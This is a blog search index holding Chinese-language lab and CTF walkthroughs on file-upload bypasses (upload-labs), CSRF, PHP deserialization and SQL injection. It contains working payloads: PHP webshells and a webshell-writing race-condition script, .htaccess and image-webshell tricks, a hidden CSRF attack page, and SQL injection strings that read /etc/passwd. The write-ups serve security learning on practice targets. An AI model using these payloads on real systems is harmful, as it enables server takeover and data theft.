<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>upload-labs1~11</title>
    <url>/2020/12/20/1/</url>
    <content><![CDATA[<p>webshell：以网页文件形式存在的一种命令执行环境（是一种网页后门），即网页木马文件。<br><strong>题目中出现的UPLOAD_PATH都是我们靶场文件夹下面的upload文件夹，如果没有请手工创建。</strong><br><img src="1.md/00.jpg"></p>
<h3 id="Pass-01-js检查"><a href="#Pass-01-js检查" class="headerlink" title="Pass-01(js检查)"></a>Pass-01(js检查)</h3><p><img src="1.md/01.png"><br>上传一句话木马，这明显的是一个js的alert提示框。我们就来尝试进行绕过。<br>第一关是一个针对于前端的验证，也就是使用JavaScript进行验证。</p>
<h4 id="方法1：brup抓包改包绕过前端"><a href="#方法1：brup抓包改包绕过前端" class="headerlink" title="方法1：brup抓包改包绕过前端"></a>方法1：brup抓包改包绕过前端</h4><p>尝试上传一个jpg格式的图片，成功。<br><img src="1.md/0.png"><br>提示：本pass在客户端使用js对不合法图片进行检查!<br>判断文件后缀的代码在前端还是后端，尝试上传一句话木马，用burp进行抓包，并没有发包，说明后缀代码在前端。<br>将文件php后缀改成jpg后上传,可以上传<br><img src="1.md/1.png"><br>再进行抓包，在把后缀jpg改成php，forward。<br><img src="1.md/2.png"><br>查看图像地址，成功修改。<br><img src="1.md/3.png"><br>使用中国蚁剑连<br><img src="1.md/4.png"></p>
<h4 id="方法2：审查元素，删除判断函数"><a href="#方法2：审查元素，删除判断函数" class="headerlink" title="方法2：审查元素，删除判断函数"></a>方法2：审查元素，删除判断函数</h4><p><img src="1.mg/5.png">删除这个函数再上传即可。</p>
<h4 id="方法3-浏览器禁用js"><a href="#方法3-浏览器禁用js" class="headerlink" title="方法3:浏览器禁用js"></a>方法3:浏览器禁用js</h4><p><img src="1.md/00.png"><br>进去后搜索javascript.enabled改成flase即可。</p>
<h3 id="Pass-02-content-type检查"><a href="#Pass-02-content-type检查" class="headerlink" title="Pass-02(content-type检查)"></a>Pass-02(content-type检查)</h3><p>mime:多用途互联网邮件扩展类型。<br>是设定某种扩展名的文件用一种应用程序来打开的方式类型（规定了扩展名）<br>其content-type（mime）是由客户端根据你上传的文件生成的，但限制只能是jpg/image格式，所以抓包改就好了.<br><img src="1.md/6.png"><br>尝试上传一句话木马，brup抓包，这次发包了。<br>查看源码，后端只检查了content-type，改包一下即可。</p>
<h3 id="Pass-03-黑名单不全"><a href="#Pass-03-黑名单不全" class="headerlink" title="Pass-03(黑名单不全)"></a>Pass-03(黑名单不全)</h3><p>修改php后缀为php6即可，其他修改方式也可以，除了基础后缀可以，其他的可能需要经过特殊解析。</p>
<h3 id="Pass-04-上传-htaccess"><a href="#Pass-04-上传-htaccess" class="headerlink" title="Pass-04(上传.htaccess)"></a>Pass-04(上传.htaccess)</h3><p>黑名单中很多后缀，但是没有.htaccess，我们可以上传.htaccess文件更改apache配置<br>htaccess文件是Apache服务器中的一个配置文件，它负责相关目录下的网页配置。<br>通过htaccess文件，可以帮我们实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能。<br><code>&lt;FilesMatch &quot;hack.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code>用记事本写脚本，把jpg修改成php格式，另存为.htaccess名，格式选择全部。</p>
<h3 id="Pass-05-上传-user-ini"><a href="#Pass-05-上传-user-ini" class="headerlink" title="Pass-05(上传.user.ini)"></a>Pass-05(上传.user.ini)</h3><p><strong>php.ini是php的配置文件,.user.ini中的字段也会被php视为配置文件来处理，从而导致php的文件解析漏洞。</strong></p>
<p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是.user.ini。<br>引发.user.ini三个条件:服务器语言为php；<br>        服务器使用CGI或FastCGI模式；<br>        上传目录下要有可执行的php文件。<br>我们上传一个内容为auto_prepend_file=1.gif的.user.ini文件，然后在上传一个命名为1.gif的一句话木马，<br>再连接的时候把文件名改成readme.php(这个文件要等待一定时间才能写好。)<br>**.user.ini文件里的意思是 所有文件都自动包含1.gif文件。.user.ini相当于一个用户自定义的php.ini。* </p>
<h3 id="Pass-06-大小写绕过"><a href="#Pass-06-大小写绕过" class="headerlink" title="Pass-06(大小写绕过)"></a>Pass-06(大小写绕过)</h3><h3 id="Pass-07-后缀名加空格"><a href="#Pass-07-后缀名加空格" class="headerlink" title="Pass-07(后缀名加空格)"></a>Pass-07(后缀名加空格)</h3><h3 id="Pass-08-后缀名加-过滤"><a href="#Pass-08-后缀名加-过滤" class="headerlink" title="Pass-08(后缀名加.过滤)"></a>Pass-08(后缀名加.过滤)</h3><p>原理:Windows系统在存储文件时会自动去掉文件名末尾的点和空格。<br>这里url末尾的点，对资源的访问没啥影响，我试了一下，多加几个点或者不加点都能访问到，但是换成其他字符不行。</p>
<h3 id="Pass-09-后缀名加-DATA"><a href="#Pass-09-后缀名加-DATA" class="headerlink" title="Pass-09(后缀名加::$DATA)"></a>Pass-09(后缀名加::$DATA)</h3><p>原理:在php+Windows的环境下，如果文件名+::$DATA会把::$DATA之后的数据当成文件流处理,不会检测后缀名,且保持::$DATA之前的文件名<br><img src="1.md/8.png"><br>查看图片<br><img src="1.md/9.png">将后缀::DATA去掉即可。<br>用中国蚁剑连接成功。</p>
<h3 id="Pass-10-点空格点过滤"><a href="#Pass-10-点空格点过滤" class="headerlink" title="Pass-10(点空格点过滤)"></a>Pass-10(点空格点过滤)</h3><h3 id="Pass-11-双写php过滤-，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。"><a href="#Pass-11-双写php过滤-，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。" class="headerlink" title="Pass-11(双写php过滤)，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。"></a>Pass-11(双写php过滤)，pphphp跟sql双写注入类似。pphphp被过滤后还剩php。</h3><p>​        </p>
<p>补充：</p>
<p>在Apache的解析顺序中，是从右到左解析，如果最右侧的扩展名不可识别，就继续往左判断，直到可解析为止</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">如果上传文件名为1.php.xxxx</span><br><span class="line">因为后缀xxxx无法解析，所以只能解析1.php</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs12~17</title>
    <url>/2020/12/23/2/</url>
    <content><![CDATA[<h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><h4 id="白名单和黑名单"><a href="#白名单和黑名单" class="headerlink" title="白名单和黑名单"></a>白名单和黑名单</h4><p><strong>白名单：设置能通过的，白名单以外的不能通过。<br>黑名单:  不能通过，除黑名单以外可以通过。</strong><br>使用白名单，只允许jpg,png,gif，pass路径可控就很好处理了。<br>理解原理：$_GET[‘save_path’]函数是文件最终存储路径。代码里面拼接了一些随机字符，我们可以上传1.jpg，而在 save_path这个最终保存路径函数下面保存为1.php并加上%00来隔断后面的随机字符，这样实际存储到服务器上面路径上就是1.php的后缀了。<br>这里利用的是00截断。即move_uploaded_file函数的底层实现类似于C语言，遇到’\0’会截断。<br>在url中%00等价于ascii码中的0，表示字符串结束，读取结束。<br>截断条件：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、php版本小于5.3.4</span><br><span class="line">2、php.ini的magic_quotes_gpc为OFF状态</span><br></pre></td></tr></table></figure>

<p><img src="2.md/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="2.md/11.png"><br>页面出错<br><img src="2.md/12.png"><br>把特殊符号删掉即可连接。<br><img src="2.md/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
<p><img src="2.md/10.png"><br>上传白名单类型文件，抓包，在路径上添加ant.php%00<br><img src="2.md/11.png"><br>页面出错<br><img src="2.md/12.png"><br>把特殊符号删掉即可连接。<br><img src="2.md/13.png"><br>文件早已成功上传。也可以直接访问ant.php连接。</p>
<h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>请求方式为POST，这里需要将%00url解码，post不像get可以自己解码。<br><img src="2.md/13.5.png"><br><img src="2.md/14.png">，成功上传。</p>
<h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>gif头文件绕过，在一句话木马加GIF89a<br><img src="2.md/15.png">成功上传。<br><strong>制作图片木马</strong><br>先找到一个图片和制作一句话木马(这里可以以txt格式,php格式的文件都可以,我就用php的。)<br><img src="2.md/16.png"><br>因为这里的图片放在桌面，我们要在桌面的位置打开cmd进行操作。<br><img src="2.md/17.png"><br>使用copy命令制作，a表示ascii码文件，b表示二进制文件。<br><img src="2.md/18.png"><br><strong>如果php文件在前，jpg图片内容会复制在其后面，会出错。<br>如果jpg在前面，php一句话木马会复制在jpg内容后面，图片内容不会出错。<br>如果两者交换文件类型图片都无法正常显示。</strong><br>制作成功：<br><img src="2.md/19.png">无法显示。<br>这里不能直接连接图片获得websell，需要解析图片，我们通过文件包含漏洞解析。<br>建议看一下：<a href="https://www.jianshu.com/p/3514f0fd79f7">https://www.jianshu.com/p/3514f0fd79f7</a><br>在upload目录下新建一个php文件写下：<br><code>&lt;?php  $file=$_GET[&#39;page&#39;]; include($file); ?&gt;</code><br>添加include.php这个访问路径，把图片解析成一句话木马。<br><img src="2.md/20.png">连接成功。<br><img src="2.md/21.png">    </p>
<h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>提示：本pass使用getimagesize()检查是否为图片文件！<br>了解函数:用于获取图像大小及相关信息，成功返回一个数组，失败则返回 FALSE 并产生一条 E_WARNING 级的错误信息。<br>这里特别的是它会检查图片内容，所以在copy图片马的时候，不能破坏图片内容，<br><code>copy 1.jpg/b + 2.php/a 666.jpg</code><br><img src="2.md/22.png">制作后，图片还是可以正常显示，用记事本打开内容，一句话木马在最末尾。<br>a表示以ascii写入，b表示二进制。<br><img src="2.md/23.png"></p>
<h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>这里需要开启php_exif模块，新版的phpstudy没有那个插件，我就下回旧版的，上传图片马即可，十四至十六差不多，只是用了不同的函数检查，<br>都通过文件包含漏洞将图片解析，不同图片类型上传方式也是一样。</p>
<h3 id="Pass-17-二次渲染"><a href="#Pass-17-二次渲染" class="headerlink" title="Pass-17(二次渲染)"></a>Pass-17(二次渲染)</h3><p>二次渲染:根据用户上传的图片，生成新的图片加入数据库，把原上传的图片删除。<br>先从gif类型图片马上传，上传成功，但是中国蚁剑连接失败，查看一下上传后图片的内容，一句话木马不见了，被二次渲染了。<br><img src="2.md/24.png">原图片的一句话木马是在末尾的，前面我们也有查看过。<br>先下载一个十六制编辑器windex，找到两个图片哪一个位置没有变化，把php代码写进去即可。<br><img src="2.md/25.png">可以连接成功，代码被执行了。<br>还有两种类型，都需要写脚本，相对比较复杂，这里就借鉴大佬的了：<a href="https://xz.aliyun.com/t/2657#toc-13">https://xz.aliyun.com/t/2657#toc-13</a></p>
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs18~21</title>
    <url>/2020/12/28/3/</url>
    <content><![CDATA[<h3 id="Pass-18-条件竞争"><a href="#Pass-18-条件竞争" class="headerlink" title="Pass-18(条件竞争)"></a>Pass-18(条件竞争)</h3><p>unlink() 函数是删除文件<br>代码审计，文件先上传到服务器再判断是否合法，合法则留下，不合法则删除<br><strong>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，<br>因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</strong><br><strong>跟c语言一样的语法，<br>fputs函数作用：向指定的文件写入一个字符串。<br>fopen：打开一个文件，<br>“w”(写入方式打开，清除文件内容，如果文件不存在则尝试重新创建.)</strong><br>构造php内容：<br><code>&lt;?php fputs(fopen(&#39;test.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39;); ?&gt;</code><br>这里注意：<strong>上传的文件名不能和新文件php名字一样，新文件成功生成了，旧文件不断上传，会把它覆盖掉，同样会被删除。</strong><br><strong>还需要双引号”cmd”,尝试单引号一直失败，单引号上传次数也很少，也不知道是为什么？<br>后面发现php单引号和双引号是有区别的，简单地说，单引号内的就直接看成字符串，双引号内的可以被解释。<br>我们通过在线编辑器来试探一下，<br><img src="3.md/1.png">会出现语法错误，因为双引号会解释内容，内容为一句话木马，会导致文件写入出现问题<br>这里还要复习一下一句话木马，@符号的意思是不报错，eval函数表示把括号内的语句字符串当作代码执行，所以在写入文件时<br>只能单纯的把一句话木马当作字符串处理；我们再把cmd换成单引号，语法也是错误的，cmd被分离出来了。<br><img src="3.md/2.png">这里错误就是意外出现字符串cmd，因为我们用来单引号，cmd就被认为字符串执行，我们可以把单引号去掉或加上双引号，发现两者都可以连接。<br>小结：为了区别这个折腾了很久，爆破了七十次，其实还是要找根本，发现php单引号双引号有区别。</strong><br>关于这个区别可以看看这篇文章：<a href="https://blog.csdn.net/hyy147/article/details/90053272">https://blog.csdn.net/hyy147/article/details/90053272</a><br>下面是操作过程：<br>首先抓好两个包再进行爆破，抓包后，转换到intruder，先把要爆破的参数都去掉，因为这里我们是通过不断发包访问页面，而不是爆破值。<br><img src="3.md/3.png">再到payload修改，这里我标注了几个地方都要特别注意。<br><img src="3.md/4.png">就是设置没有payload，无限期地继续。<br>上面是不断上传php文件，同时我们还需要去打开它，访问它，所以新建一个访问页面<br><img src="3.md/5.png">抓包下来，修改同上面的一样，无需clear参数<br>最后修改一下线程为20，开始爆破。<br><img src="3.md/6.png">一下子就上传上去了，如果一直失败，要好好看看php内容有没有写错了。</p>
<h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>分析源码，先判断了文件的后缀名，这里就不能直接上传php，考虑上传图片马。<br>然后是检查文件大小，检查文件是否存在，移动文件，重命名文件。<br>上传图片马，再用之前创建好的文件包含漏洞，<br><img src="3.md/7.png">提示我们本来就有一个文件包含，我们需要要它给的，<br>成功解析，<img src="3.md/8.png"><br>这里应该也是考图片马上传条件竞争，但是我的图片马上传没有问题，再解析一下即可，还有这里文件上传的路径也改变了。</p>
<h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>这里我随便上传一个php都成功了，不知道出什么问题了，大概说一下网上师傅的做法。<br>方法一(0x00截断)：抓包会显示a.php**.jpg在**这加0x00截断，表示十六进制的00，访问的就是php文件了，jpg被截断了。<br>方法二：在php后缀加/.绕过，因为move_uploaded_file底层会调用函数tsrm_realpath，导致递归删除文件名最后的/.成功可以绕过后缀名的检测。<br>方法三：大小写绕过。</p>
<h3 id="Pass-21-MIME-数组"><a href="#Pass-21-MIME-数组" class="headerlink" title="Pass-21(MIME,数组,/.)"></a>Pass-21(MIME,数组,/.)</h3><p>审计源码，先检查MIME<br>MIME:MIME消息可以包含文本、图像、音频、视频以及其他应用程序专用的数据。<br>再检查文件名，这里同样有的move_uploaded_file函数可以加/.绕过。<br>explode函数(separator,string,limit)把字符串打散成数组。<br>如果file变量不是数组，会将file变量先小写，再通过函数explode变成数组(以点为分隔符)如何取它的后缀名，并重新定义一个运行上穿的后缀名数组。<br>可以看到filename是文件本来的名称，而save_name是传递的参数,我们来构造参数名数组，设置两个元素的数组<br>经过函数处理，后缀就变成file[1],我们构造的有file[0],file[2],file[2]变为file[1]返回为空。<br><img src="/home/cookie/Blog/source/_posts/3/9.png"></p>
]]></content>
      <tags>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF</title>
    <url>/2021/01/09/CSRF/</url>
    <content><![CDATA[<h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><p><strong>CSRF，全称Cross-site request forgery，即跨站请求伪造，<br>是指利用受害者尚未失效的身份认证信息(cookie,session等)，诱骗其点击恶意的链接或者访问包含攻击代码的页面，<br>在受害人不知情的情况下以受害者的身份向服务器，从而完成非法操作(如转账，改密等)。<br>CSRF与XSS最大区别：CSRF并没有盗用cookie而是直接利用。</strong></p>
<ul>
<li>low<br>查看源码，服务器收到修改密码的请求后，会检查pass_new和pass_conf是否一致，如果相同，就会修改密码，并没有做任何的csrf机制。<br>当受害者点击了这个链接，他的密码就会被改成password，<br><img src="CSRF.md/1.png"><br><code>http://localhost/vulnerabilities/csrf/?password_new=000&amp;password_conf=000&amp;Change=Change#</code></li>
<li><em>需要注意的是，csrf关键是利用受害者cookie发送伪造请求，要求之前登陆的这个系统和点击这个链接使用的是同一个浏览器的cookie。</em>*<br>方法一：这样的链接太暴露了，可以通过短链接隐藏url内容。<br>方法二：构造攻击页面：<br>`<img src="http://localhost/vulnerabilities/csrf/?password_new=000&password_conf=000&Change=Change#" border="0" style="display:none;"/><h1>404<h1>
<h2>file not found.<h2>`    
当受害者访问change.html时，会误认为是自己点击的是一个失效的url，但实际上已经遭受了CSRF攻击，密码已经被修改为了000。</li>
<li>medium<br>查看源码，有个函数eregi(与ereg函数完全一致，只是忽略大小写)，检查了保留变量HTTP_REFFER(表示来自哪里)中是否包含SEVER_NAME（http包头的Host参数）来抵御CSRF攻击。<br>把构造攻击页面的代码文件名重命名为host参数。</li>
<li>high<br>出现了一个Anti-CSRF token机制，关键在于获取token值，这里利用XSS注入获取。<br><code>&lt;iframe src=&quot;../csrf&quot;onload=alert(frames[0].document.getElementsByName(&#39;user_token&#39;)[0].value)</code><br>使用这个方法一直弹不出token值，。。。</li>
</ul>
]]></content>
      <tags>
        <tag>CSRF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-PHP序列化安全</title>
    <url>/2021/05/30/CTF-PHP%E5%BA%8F%E5%88%97%E5%8C%96%E5%AE%89%E5%85%A8/</url>
    <content><![CDATA[<h3 id="PHP序列化安全"><a href="#PHP序列化安全" class="headerlink" title="PHP序列化安全"></a>PHP序列化安全</h3><p>序列化和反序列化</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">序列化 将复杂的数据结构转换为适合传输和保存的字节类型。(存储)</span><br><span class="line">反序列化 将字节类型转换为复杂的数据结构(程序使用)</span><br></pre></td></tr></table></figure>



<ul>
<li>序列化和反序列化并非php独有，php，ruby，java都具有该技术。</li>
</ul>
<h4 id="PHP序列化操作"><a href="#PHP序列化操作" class="headerlink" title="PHP序列化操作"></a>PHP序列化操作</h4><p><a href="https://www.php.net/manual/zh/function.serialize.php">https://www.php.net/manual/zh/function.serialize.php</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	class Site&#123;</span><br><span class="line">		public $name=&#x27;ctf&#x27;;</span><br><span class="line">		public function get_name()</span><br><span class="line">		&#123;</span><br><span class="line">			echo $name;</span><br><span class="line">			echo md5(&#x27;admin&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">$a=new site();</span><br><span class="line">$b=serialize($a);</span><br><span class="line">echo $b;</span><br><span class="line">$c=unserialize($b);</span><br><span class="line">$c-&gt;get_name();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>通过反序列化操作将序列化对象 转换为 对象类型，调用其中的get_name方法。如果用户可自定义提交序列化字符串，那么此时反序列化后，就可以控制程序执行的代码，造成安全威胁。</p>
<p>一般不会直接调用方法，而是通过一些魔术方法调用其中的函数。</p>
<h4 id="PHP反序列化CTF案例"><a href="#PHP反序列化CTF案例" class="headerlink" title="PHP反序列化CTF案例"></a>PHP反序列化CTF案例</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unserialize()会检查是否存在一个_wakeup()方法，如果存在，则先调用_wakeup方法，预先准备对象需要的资源。</span><br></pre></td></tr></table></figure>

<p>实验代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	$data=file_get_contents(&quot;php://input&quot;);</span><br><span class="line">	class Site&#123;</span><br><span class="line">		public $name=&#x27;ctf&#x27;;</span><br><span class="line">		public function __wakeup()&#123;</span><br><span class="line">			echo &#x27;flag&#123;xxx&#125;&#x27;;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">$obj =unserialize($data);</span><br></pre></td></tr></table></figure>



<p>1、序列化字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O:4:&quot;Site&quot;:1:&#123;s:4:&quot;name&quot;;s:3:&quot;ctf&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>2、发送字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">通过burp</span><br><span class="line">post提交字符串</span><br></pre></td></tr></table></figure>







<h4 id="PHP反序列化识别与利用"><a href="#PHP反序列化识别与利用" class="headerlink" title="PHP反序列化识别与利用"></a>PHP反序列化识别与利用</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">反序列化识别根本 在于发现HTTP请求是否存在序列化字符串</span><br></pre></td></tr></table></figure>



<p>反序列化识别</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">burp 可自动识别HTTP请求中的序列化字符串</span><br></pre></td></tr></table></figure>



<p>1、burp代理截断，截获http请求数据包。</p>
<p>2、burp target扫描请求</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在HTTP中，右键鼠标，进行扫描。</span><br><span class="line">可发现漏洞。</span><br></pre></td></tr></table></figure>



<p>如果要求post提交，需要将get改成post，右键选中change request method。</p>
<h4 id="PHP序列化特殊点介绍"><a href="#PHP序列化特殊点介绍" class="headerlink" title="PHP序列化特殊点介绍"></a>PHP序列化特殊点介绍</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在定义类时，对应的属性可设置访问限制。通过public、protected、private进行设置权限。对于序列化对象中的数字是否可以有符号问题。	 </span><br></pre></td></tr></table></figure>



<p>对象中的属性修饰符</p>
<p>定义user类，并且设置属性具有protected和private属性</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">	protected $name=&#x27;admin&#x27;;</span><br><span class="line">	private $admin=&#x27;true&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$user=new user();</span><br><span class="line">echo serialize($user);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>



<p>直接查看浏览器无法识别符号，可使用python输出。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、protected 修饰的属性在序列化之后，修改为 \x00*\x00属性名</span><br><span class="line">2、private 修饰的属性在序列化之后，修改为 \x00类名\x00属性名</span><br></pre></td></tr></table></figure>





<h4 id="序列化字符串中的-号"><a href="#序列化字符串中的-号" class="headerlink" title="序列化字符串中的+号"></a>序列化字符串中的+号</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">在序列化字符串中的数字前可使用+号表示正数，不影响反序列化的结果。</span><br></pre></td></tr></table></figure>

<p>可绕过数字过滤，在需要进行URL编码%2b</p>
<h4 id="PHP序列化-魔术方法"><a href="#PHP序列化-魔术方法" class="headerlink" title="PHP序列化 - 魔术方法"></a>PHP序列化 - 魔术方法</h4><h4 id=""><a href="#" class="headerlink" title=""></a></h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">魔术方法 是定义类过程中 以双下划线开头、PHP语言定义好的方法。</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__construct():类的析造函数</span><br><span class="line">__destruct():类的析构函数</span><br><span class="line">__wakeup():执行unserialize()时，先会调用这个函数</span><br><span class="line">__tostring():类被当作字符串回应的方法。</span><br></pre></td></tr></table></figure>



<ul>
<li>flag被注释的时候，执行命令查看flag时，可用type flag。</li>
</ul>
]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SQL注入进阶</title>
    <url>/2021/06/02/CTF-SQL%E6%B3%A8%E5%85%A5%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<h3 id="CTF-SQL注入进阶"><a href="#CTF-SQL注入进阶" class="headerlink" title="CTF-SQL注入进阶"></a>CTF-SQL注入进阶</h3><h4 id="limit注入"><a href="#limit注入" class="headerlink" title="limit注入"></a>limit注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">实际程序中，常需要查询某些符合条件的具体数量的记录。此时mysql中提供limit帮助用户返回数据表中的多条记录。如：网站无法在一个页面中显示所有信息条目，此时采用分页显示。</span><br></pre></td></tr></table></figure>





<p>limit语法，前面文章介绍过。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">limit 从起始位置，取多少条记录。起始位置为0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select * from users limit 1 offset 0</span><br><span class="line">读取一条记录，从第一条开始。</span><br><span class="line"></span><br></pre></td></tr></table></figure>





<p><strong>MYSQL LIMIT 注入原理</strong></p>
<p>适用于mysql5.6版本一下。</p>
<p>通过联合注入，其实就跟联合注入没什么区别，但是加上order by就不一样了。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users limit 0,1 union select 1,2,3</span><br></pre></td></tr></table></figure>





<p>sql修改成：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users order by id limit 0,1;</span><br><span class="line"></span><br><span class="line">此时无法使用union联合查询注入，由于order by 后无法使用union，无法利用联合注入。</span><br></pre></td></tr></table></figure>



<p>报错注入</p>
<p>原sql语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users order by id limit &#123;$id&#125;,1;</span><br></pre></td></tr></table></figure>



<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=0,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br></pre></td></tr></table></figure>









<h4 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h4><p>语法功能</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对结果进行排序操作，mysql提供了order by 进行查询结果的排序，</span><br><span class="line">默认升序，添加降序desc。</span><br></pre></td></tr></table></figure>



<p>一些相关操作</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可使用字段名排序</span><br><span class="line">select * from users order by username;</span><br><span class="line">使用数字进行排序</span><br><span class="line">selcet * from users order by 2;</span><br><span class="line">两者查询结果相同</span><br></pre></td></tr></table></figure>



<p><strong>可通过order by 盲注出密码。</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">密码为abc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">username=admin&#x27; union select 1,2,&#x27;a&#x27; order by 3#&amp;password=123</span><br><span class="line">由于a小于abc，a所在行数据上移动，用户名报错。</span><br><span class="line">b大于abc，密码报错。</span><br><span class="line">admin行数据上移动，得到正确的admin，密码报错。</span><br><span class="line"></span><br></pre></td></tr></table></figure>







<h4 id="order-by-后注入"><a href="#order-by-后注入" class="headerlink" title="order by 后注入"></a>order by 后注入</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">selcet * from users order by id</span><br><span class="line">selcet * from users order by 1</span><br><span class="line">两者返回结果相同</span><br></pre></td></tr></table></figure>



<p>通过报错猜字段名、字段数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username(字段名)</span><br><span class="line">6(列数)</span><br></pre></td></tr></table></figure>





<p>sql语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from users order by &#123;$order&#125;</span><br></pre></td></tr></table></figure>



<p><strong>注入点利用方式</strong></p>
<p>发现order by型，通过输入不同字段名，排序发生改变。</p>
<p>报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order=updatexml(1,concat(0x7c,database()),1)</span><br></pre></td></tr></table></figure>





<p>时间盲注</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">order=if(length(database())&gt;8,sleep(1),1)</span><br></pre></td></tr></table></figure>





<h4 id="sql-读写文件"><a href="#sql-读写文件" class="headerlink" title="sql-读写文件"></a>sql-读写文件</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">可对本地文件系统进行读写操作。</span><br></pre></td></tr></table></figure>

<p>若flag不存在数据库中，此时考虑sql注入的读写文件操作。</p>
<p>MYSQL配置读写权限</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">配置权限针对具体用户，查询当前用户</span><br><span class="line"></span><br><span class="line">select current_user();</span><br><span class="line">返回user=root</span><br><span class="line">host=localhost</span><br></pre></td></tr></table></figure>



<p><strong>1、查看当前用户文件操作权限(File_priv)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select File_priv from mysql.user where user=&#x27;root&#x27; and host=&#x27;localhost&#x27;;</span><br></pre></td></tr></table></figure>



<p>返回Y，表示具有对本地文件系统的读写操作。</p>
<p><strong>2、数据库导入导出权限(secure_file_priv)</strong></p>
<p>查看(secure_file_priv)变量</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show VARIABLES like &quot;secure_file_priv&quot;;</span><br></pre></td></tr></table></figure>



<p>当(secure_file_priv)为空时，表示无限制，若为NULL，表示没有任何权限。</p>
<p>如果(secure_file_priv)为一个路径，表示只有对该路径的导入导出权限。</p>
<p><strong>读文件</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select load_file(&quot;/etc/passwd&quot;)	</span><br></pre></td></tr></table></figure>



<p><strong>写入一句话木马</strong></p>
